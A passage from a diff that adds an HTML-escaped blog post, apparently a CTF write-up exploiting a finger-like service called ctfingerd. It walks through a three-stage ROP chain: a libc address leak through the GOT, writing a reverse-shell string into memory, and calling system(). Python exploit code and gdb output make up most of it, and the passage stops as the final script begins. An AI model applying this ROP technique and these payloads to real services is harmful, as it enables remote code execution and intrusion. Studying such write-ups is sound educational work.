+  1337: 0000000000041490    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Get address of memset() in GOT = 0x6014e0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64# objdump -R ctfingerd | grep memset
+00000000006014e0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The other thing we need to do is make sure we are writing back to the correct socket. The developer conveniently gave us the socket FD so we can capture that.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;:&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now what we need to do is find some a ROP gadget that will help us leak the address of memset(). What we are looking for is a pop3ret to pop rdi, rsi, and rdx and finally return. Problem is we don’t have a pop3ret but we do have the below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s1&quot;&gt;'pop rsi'&lt;/span&gt;
+Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ROP gadget: &lt;span class=&quot;s1&quot;&gt;'pop rsi'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: binary ranges
+0x00401011 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;'5e415fc3'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	pop rsi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pop r15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s1&quot;&gt;'pop rdi'&lt;/span&gt;
+Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ROP gadget: &lt;span class=&quot;s1&quot;&gt;'pop rdi'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: binary ranges
+0x00401013 : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;b&lt;span class=&quot;s1&quot;&gt;'5fc3'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	pop rdi&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ret
+gdb-peda&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ropsearch &lt;span class=&quot;s1&quot;&gt;'pop rdx'&lt;/span&gt;
+Searching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ROP gadget: &lt;span class=&quot;s1&quot;&gt;'pop rdx'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;: binary ranges
+Not found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So our exploit will look like this now.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;0x00 - 0 out the return address&lt;/li&gt;
+  &lt;li&gt;0x00401013 - Address of our pop rdi ; ret. Popping the socketFD into rdi.&lt;/li&gt;
+  &lt;li&gt;Socket FD - The socket to write the results back to.&lt;/li&gt;
+  &lt;li&gt;0x00401011 - Address of our pop rsi; pop r15; ret. - Will address of memset() into rsi and some junk in r15.&lt;/li&gt;
+  &lt;li&gt;0x6014e0 - Address of memset() in the GOT.&lt;/li&gt;
+  &lt;li&gt;0x00 - Junk for r15&lt;/li&gt;
+  &lt;li&gt;0x400920 - Address of write@plt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So at this point we will pop the socketFD into rdi , the address of memset() in the GOT into rsi and some junk into r15. At that point we will call write() which will write back the address of memset() in libc to us.&lt;/p&gt;
+
+&lt;p&gt;We can use that to calculate the libc base and the final address of system() with some simple math. So I present to you the stage 1 code.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;memset_got&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6014e0&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;memset_libc_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x85620&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_libc_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x41490&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400920&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4009b0&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00401013&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00401011&lt;/span&gt;
+
+
+&lt;span class=&quot;c&quot;&gt;# Stage 1: leak memset() libc address using write@pld&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# trigger overflow&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;					&lt;span class=&quot;c&quot;&gt;# insert correct canary&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# overwrite RBP&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rdi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# stdout to socket&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rsi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memset_got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# address to read from&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# junk for r15&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;# return to write@plt&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shutdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] memset() is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memset_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memset_libc_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] libc base is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_libc_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] sysem() is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now for stage two we need to save our reverse shell string to a writable location. I’m using a simple nc reverse shell for this one, we’ll use read@plt to read from the socket and save it to a location in memory.&lt;/p&gt;
+
+&lt;p&gt;Our new ROP chain will look something like this for Stage 2&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Canary&lt;/li&gt;
+  &lt;li&gt;0x00 - 0 out the return address&lt;/li&gt;
+  &lt;li&gt;0x00401013 - Address of our pop rdi; ret. Popping the socketFD into RDI&lt;/li&gt;
+  &lt;li&gt;Socket FD - The socket to read our reverse shell from&lt;/li&gt;
+  &lt;li&gt;0x00401011 - Address of our pop rsi; pop r15; ret. - Will set the location in memorty to write to.&lt;/li&gt;
+  &lt;li&gt;0x601010 - Memory location to store our reverse shell command.&lt;/li&gt;
+  &lt;li&gt;sockFD - Junk for r15&lt;/li&gt;
+  &lt;li&gt;0x4009b0 - Address of read@plt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Stage 2: Save string to writable location&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rdi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# socket to read from&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rsi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x601010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# location to write to&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# junk for r15&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# return to read()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now for Stage 3, we just need to pop the location of our reverse shell command into RDI and call system()&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Stage 3: call system() with location of string&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x601010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So when we put it all together, here is our final exploit code.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;990&lt;/span&gt;
